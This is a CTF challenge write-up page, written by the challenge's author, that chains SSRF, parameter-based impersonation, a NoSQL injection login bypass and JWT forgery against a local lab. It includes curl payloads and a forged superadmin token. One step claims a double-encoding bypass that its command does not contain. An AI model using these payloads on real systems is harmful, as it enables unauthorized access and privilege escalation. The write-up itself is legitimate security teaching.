@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>d3uc3-dev Writeup | SSRF & NoSQLi | t3rm1n4t0rs CTF</title>
+    <meta name="description" content="Technical walkthrough of the d3uc3-dev challenge. Exploiting SSRF, NoSQL Injection, and JWT Forgery to achieve Superadmin status.">
+    <link rel="stylesheet" href="../../../style.css">
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <nav>
+        <div class="logo"><a href="../../../index.html">gr4ktung</a></div>
+        
+        <div class="search-container">
+            <span class="search-prompt">gr4ktung@blog:~$ grep</span>
+            <input type="text" id="site-search" placeholder="..." autocomplete="off">
+        </div>
+
+        <div class="nav-links">
+            <a href="../../../about.html">~/about</a>
+            <a href="../../../blog.html" class="active">~/posts</a>
+            <a href="../../../achievements.html">~/achievements</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="writeup-layout">
+            
+            <aside class="sidebar">
+                <h4>MISSION_BRIEF</h4>
+                <div class="intel-grid">
+                    <div class="detail-box">
+                        <span class="label">Target</span>
+                        <span class="value">Deuce Corp</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Category</span>
+                        <span class="value">Web Exploit</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Event</span>
+                        <span class="value">t3rmin4t0rs 26</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Difficulty</span>
+                        <span class="value" style="color: #ff3e3e;">Hard</span>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <span class="tag">SSRF</span>
+                    <span class="tag">NoSQLi</span>
+                    <span class="tag">JWT Forgery</span>
+                    <span class="tag">Bypass</span>
+                </div>
+            </aside>
+
+            <article class="blog-content" style="min-width: 0;">
+                <h1>Official Writeup: d3uc3_d3v</h1>
+                <div class="blog-meta">
+                    > Published: March 10, 2026 | ⏱ 7 min read | Author: gr4ktung
+                </div>
+
+                <h3>📖 Description</h3>
+                <p>This challenge simulates a vulnerable internal development environment for <strong>Deuce Corp</strong>. The objective is to escalate privileges from a normal user to superadmin and retrieve the flag by exploiting multiple web vulnerabilities.</p>
+                
+                <blockquote>
+                    Hello, I'm the creator of this challenge in the <strong>t3rmin4t0rs CTF 2026</strong>. Due to server being down..., I accessed the lab locally for this walkthrough.
+                </blockquote>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 1: Information Disclosure & Recon</h3>
+                <p>Visiting the website, we are redirected to <code>login.html</code>. Looking at the page source and console, we find cryptic scripts revealing a secret storage location for credentials.</p>
+                
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce01.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <p>I ran a directory scan using <strong>Gobuster</strong> to find hidden entry points:</p>
+                <div class="command-block">gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</div>
+                 
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce02.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <p>The scan revealed three interesting directories: <code>/chat</code>, <code>/secrets</code>, and <code>/proxy</code>.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 2: SSRF & Double Encoding Bypass</h3>
+                <p>Directly accessing <code>/chat</code> redirects to the login page. However, the <code>/proxy</code> endpoint acts as a URL fetcher—a classic SSRF vector. I used double-encoding to bypass the internal filters:</p>
+                
+                <div class="command-block"># Using %2573 (double-encoded 's') to bypass filters
+curl "http://localhost:8080/proxy?url=http://localhost:8080/secrets/creds.txt"</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+               <img src="../t3rmin4t0rs_ctf-2026/images/deuce03.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+                <p>🔑 <strong>Result:</strong> We successfully obtained user credentials from the internal secrets directory.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 3: API Hijacking</h3>
+                <p>After logging in, we access a chatbot system. While the bot won't give the flag directly, intercepting the traffic reveals an API endpoint. By hijacking the <code>sender</code> parameter, we can impersonate the user 'deuce':</p>
+                
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce04.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+              
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce05.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+
+                <div class="command-block">curl -i -b cookies.txt "http://localhost:8080/chat/api/chat.php?sender=deuce"</div>
+    
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce06.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+                <p>This revealed a hidden admin panel endpoint: <code>/st3wi3-t3rm_p4n3l</code>.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 4: NoSQL Injection</h3>
+                <p>Navigating to the admin panel redirects us to <code>login.php</code>. Standard passwords fail with a 401 Unauthorized. However, the backend is vulnerable to <strong>NoSQL Injection</strong> in the JSON body:</p>
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce07.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+
+                <div class="command-block">curl -i -X POST "http://localhost:8080/st3wi3-t3rm_p4n3l/login.php" \
+-H "Content-Type: application/json" \
+-d '{"email":{"$ne":""},"password":{"$ne":""}}'</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce08.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+
+                <p>The server responds with a 302 Found, giving us an admin session cookie.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 5: JWT Analysis & Secret Key Discovery</h3>
+                <p>Using the admin cookie, I accessed <code>index.php</code> and discovered the JWT secret key exposed in the environment info:</p>
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce09.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+                
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <div class="command-block">curl -i -b cookies.txt "http://localhost:8080/st3wi3-t3rm_p4n3l/index.php"</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce10.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+                <p>The JWT payload shows our current role is <code>admin</code>, but <code>dashboard.php</code> requires <code>superadmin</code> status to read the flag.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 6: Privilege Escalation via JWT Forgery</h3>
+                <p>Using the discovered secret key, I forged a new JWT token, changing the role from <code>admin</code> to <code>superadmin</code>. Accessing the dashboard with the forged token yields the flag:</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <div class="command-block" style="overflow-x: auto; word-break: break-all;">curl -i "http://localhost:8080/st3wi3-t3rm_p4n3l/dashboard.php" \
+-H "Cookie: admin=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImRldkBkZXVjZS5jb3JwIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.-1nT-VnXHWXax9ma8wbpb5T7ylXysUCZIV_WZUC_iRg"</div>
+
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+
+                <img src="../t3rmin4t0rs_ctf-2026/images/deuce11.png" alt="Challenge Interface" class="content-img" style="max-width: 100%;">
+
+
+                <div style="text-align: center; margin-top: 40px;">
+                    <div class="flag-block">t3rmctf{y0u_d3s3rv3_4_cr0wn!!!}</div>
+                </div>
+
+                <div class="post-nav">
+                    <a href="../../../blog.html" class="btn">RETURN_TO_DIR</a>
+                </div>
+            </article>
+
+            <aside class="sidebar" style="background: transparent; border: none; padding: 0;">
+                <h4 style="padding-left: 20px;">RELATED_INTEL FROM t3rmin4t0rs-CTF 2026</h4>
+                <div class="staggered-links">
+                    <a href="../t3rmin4t0rs_ctf-2026/ailavator.html" class="stagger-link">Boot2Root: Ailavator</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/dc.html" class="stagger-link">IoT/Web: D-C</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/epst3in-files.html" class="stagger-link">Web: Epst3in-files</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/l33node-m4g1c.html" class="stagger-link">Web: l33node-m4g1c</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/majembe.html" class="stagger-link">Crypto: Maj3mb3</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/mbavu-destroyer.html" class="stagger-link">Crypto: Mb4vu-d3stroy3r</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/tony-st4ck.html" class="stagger-link">Forensics: T0ny-st4ck</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/weka-mawe01.html" class="stagger-link">Misc: W3k4-m4w3 01</a>
+                    <a href="../t3rmin4t0rs_ctf-2026/weka-mawe02.html" class="stagger-link">Misc: W3k4-m4w3</a>
+                </div>
+            </aside> 
+        </div>
+    </main>
+
+    <footer>
+        <p>sys.exit(0) | Designed by gr4ktung </p>
+    </footer>
+
+    <div class="scroll-controls">
+        <button class="scroll-btn" id="scroll-to-top">↑</button>
+        <button class="scroll-btn" id="scroll-to-bottom">↓</button>
+    </div>
+
+    <script src="../../../script.js"></script>
+</body>
+</html>
